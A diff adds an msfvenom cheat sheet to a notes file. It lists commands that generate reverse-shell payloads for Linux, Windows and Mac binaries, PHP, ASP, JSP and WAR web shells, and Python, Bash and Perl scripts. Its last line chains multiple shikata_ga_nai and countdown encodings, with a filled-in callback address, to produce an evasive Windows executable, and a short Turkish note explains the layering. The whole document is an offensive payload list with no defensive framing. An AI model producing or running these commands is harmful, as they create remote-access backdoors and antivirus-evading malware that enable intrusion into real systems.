@@ -1,3 +1,58 @@
+List Payloads
+=============
+
+msfvenom -l
+
+Binaries Linux
+=============
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf
+
+Windows
+=======
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe
+
+Mac
+===
+msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho
+
+Web Payloads PHP
+================
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+ASP
+===
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
+
+JSP
+===
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
+
+WAR
+===
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
+
+Scripting Payloads Python
+=========================
+
+msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
+
+Bash
+===
+
+msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
+
+Perl
+====
+
+msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
+
+
 “msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f raw -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -e x86/countdown -i 5 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 20 -f exe -o /root/Desktop/eyup2.exe”
 
 multiple encoding => 10 iterasyonluk shikata_ga_nai üzerine 5 iterasyonluk coutdown ve onunda üzerine 20 iterasyonluk shikata_ga_nai yapıldı.
